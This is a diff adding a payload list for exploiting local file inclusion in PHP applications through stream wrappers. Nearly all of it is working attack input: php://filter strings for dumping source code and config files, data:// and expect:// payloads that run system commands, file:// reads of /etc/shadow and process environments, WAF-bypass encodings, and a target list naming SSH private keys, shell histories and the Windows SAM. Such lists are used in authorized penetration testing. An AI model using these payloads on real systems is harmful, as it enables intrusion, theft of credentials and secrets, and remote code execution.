@@ -1,0 +1,197 @@
+# PHP Wrapper LFI Payloads
+# For exploiting Local File Inclusion via PHP stream wrappers
+# These can escalate LFI to RCE or sensitive data disclosure
+
+# ==============================================================================
+# php://filter - Read files with encoding (bypass WAF, extract PHP source)
+# ==============================================================================
+
+# Base64 encode to extract PHP source code (most common)
+php://filter/convert.base64-encode/resource=index.php
+php://filter/convert.base64-encode/resource=config.php
+php://filter/convert.base64-encode/resource=../config.php
+php://filter/convert.base64-encode/resource=../../config.php
+php://filter/convert.base64-encode/resource=../../../config.php
+php://filter/convert.base64-encode/resource=/var/www/html/index.php
+php://filter/convert.base64-encode/resource=/var/www/html/config.php
+php://filter/convert.base64-encode/resource=/etc/passwd
+
+# Read common config files
+php://filter/convert.base64-encode/resource=wp-config.php
+php://filter/convert.base64-encode/resource=configuration.php
+php://filter/convert.base64-encode/resource=settings.php
+php://filter/convert.base64-encode/resource=database.php
+php://filter/convert.base64-encode/resource=db.php
+php://filter/convert.base64-encode/resource=.env
+php://filter/convert.base64-encode/resource=../.env
+
+# Read without encoding (may work when filter is blocked)
+php://filter/resource=index.php
+php://filter/resource=/etc/passwd
+php://filter/resource=/etc/shadow
+
+# ROT13 encoding (alternative when base64 is blocked)
+php://filter/read=string.rot13/resource=index.php
+php://filter/read=string.rot13/resource=config.php
+
+# UTF encoding conversions
+php://filter/convert.iconv.utf-8.utf-16/resource=index.php
+php://filter/convert.iconv.utf-16.utf-8/resource=index.php
+
+# Zlib compression (may bypass WAF)
+php://filter/zlib.deflate/resource=index.php
+php://filter/zlib.inflate/resource=compressed_file
+
+# Chained filters (may bypass certain protections)
+php://filter/read=convert.base64-encode|convert.base64-encode/resource=index.php
+php://filter/convert.base64-decode|convert.base64-encode/resource=index.php
+
+# ==============================================================================
+# php://input - Execute arbitrary PHP (requires POST body, allow_url_include)
+# ==============================================================================
+
+# Basic RCE via php://input (send PHP code in POST body)
+php://input
+
+# ==============================================================================
+# data:// - Inline data with PHP execution (requires allow_url_include)
+# ==============================================================================
+
+# Basic PHPinfo (test payload)
+data://text/plain,<?php phpinfo();?>
+data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+# Command execution
+data://text/plain,<?php system('id');?>
+data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+
+
+# Alternative encodings
+data:text/plain,<?php phpinfo();?>
+data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+
+
+# ==============================================================================
+# expect:// - Direct command execution (requires expect extension)
+# ==============================================================================
+
+expect://id
+expect://whoami
+expect://cat /etc/passwd
+expect://ls -la
+
+# ==============================================================================
+# file:// - Local file read (explicit protocol)
+# ==============================================================================
+
+file:///etc/passwd
+file:///etc/shadow
+file:///etc/hosts
+file:///proc/self/environ
+file:///proc/self/cmdline
+file:///proc/self/fd/0
+file:///var/log/apache2/access.log
+file:///var/log/apache2/error.log
+file:///var/log/nginx/access.log
+file:///var/log/nginx/error.log
+
+# Windows paths
+file:///C:/Windows/System32/drivers/etc/hosts
+file:///C:/Windows/win.ini
+file:///C:/inetpub/wwwroot/web.config
+
+# ==============================================================================
+# phar:// - PHP archive exploitation (may lead to deserialization RCE)
+# ==============================================================================
+
+# If attacker can upload a PHAR file
+phar://path/to/uploaded.phar
+phar://path/to/uploaded.jpg
+phar://path/to/uploaded.png
+
+# PHAR with metadata deserialization (gadget chain dependent)
+phar://uploads/evil.phar/test.txt
+
+# ==============================================================================
+# zip:// - ZIP archive extraction
+# ==============================================================================
+
+# Read file inside uploaded ZIP
+zip://path/to/uploaded.zip#file.php
+zip://uploads/archive.zip#shell.php
+
+# ==============================================================================
+# compress.zlib:// and compress.bzip2:// - Compressed file read
+# ==============================================================================
+
+compress.zlib:///etc/passwd
+compress.bzip2:///etc/passwd
+compress.zlib://path/to/file.gz
+
+# ==============================================================================
+# glob:// - Directory listing (limited use)
+# ==============================================================================
+
+glob:///var/www/html/*.php
+glob:///etc/*.conf
+
+# ==============================================================================
+# BYPASSES - When basic wrappers are blocked
+# ==============================================================================
+
+# Double URL encoding
+php%253A%252F%252Ffilter%252Fconvert.base64-encode%252Fresource%253Dindex.php
+
+# Case variations
+PHP://filter/convert.base64-encode/resource=index.php
+Php://filter/convert.base64-encode/resource=index.php
+
+# Null byte injection (older PHP versions)
+php://filter/convert.base64-encode/resource=index.php%00
+php://filter/convert.base64-encode/resource=index.php%00.jpg
+
+# Path traversal combined with wrappers
+php://filter/convert.base64-encode/resource=....//....//etc/passwd
+php://filter/convert.base64-encode/resource=..%2F..%2F..%2Fetc%2Fpasswd
+
+# ==============================================================================
+# SENSITIVE FILES TO TARGET (append to wrapper paths)
+# ==============================================================================
+
+# Web application configs
+# index.php
+# config.php
+# wp-config.php
+# configuration.php
+# settings.php
+# database.php
+# db.php
+# .env
+# .htaccess
+# .htpasswd
+# web.config
+
+# Linux system files
+# /etc/passwd
+# /etc/shadow
+# /etc/hosts
+# /etc/hostname
+# /etc/resolv.conf
+# /etc/crontab
+# /proc/self/environ
+# /proc/self/cmdline
+# /proc/version
+# /proc/net/tcp
+# /proc/net/arp
+# /var/log/auth.log
+# /var/log/syslog
+# /root/.bash_history
+# /root/.ssh/id_rsa
+# /home/*/.bash_history
+# /home/*/.ssh/id_rsa
+
+# Windows system files
+# C:\Windows\System32\drivers\etc\hosts
+# C:\Windows\win.ini
+# C:\Windows\System32\config\SAM
+# C:\inetpub\wwwroot\web.config
+# C:\xampp\apache\conf\httpd.conf
+# C:\Program Files\MySQL\my.ini
